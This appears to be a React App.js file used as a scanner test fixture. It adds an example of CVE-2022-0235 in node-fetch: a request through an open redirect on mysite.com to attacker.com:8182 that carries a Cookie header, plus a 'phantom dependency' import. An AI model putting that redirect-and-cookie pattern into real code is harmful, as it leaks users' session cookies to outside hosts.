import logo from './logo.svg';
import './App.css';

// Example of calling a vulnerable function from CVE-2022-0235
import fetch from 'node-fetch';

const body = {a: 1};

const response = await fetch('http://mysite.com/redirect.php?url=http://attacker.com:8182/dd', {
    method: 'post',
    body: JSON.stringify(body),
    headers: {'Cookie': 'asd=ad'}
});
const data = await response.json();

console.log(data);

// Example of using Phantom Dependency from react-admin
import styled from '@emotion/styled'

let SomeComp = styled.div({
  color: 'hotpink'
})

let AnotherComp = styled.div`
  color: ${props => props.color};
`

render(
  <SomeComp>
    <AnotherComp color="green" />
  </SomeComp>
)


function App() {
  return (
    <div className="App">
      <header className="App-header">
        <img src={logo} className="App-logo" alt="logo" />
        <p>
          Edit <code>src/App.js</code> and save to reload.
        </p>
        <a
          className="App-link"
          href="https://reactjs.org"
          target="_blank"
          rel="noopener noreferrer"
        >
          Learn React
        </a>
      </header>
    </div>
  );
}

export default App;
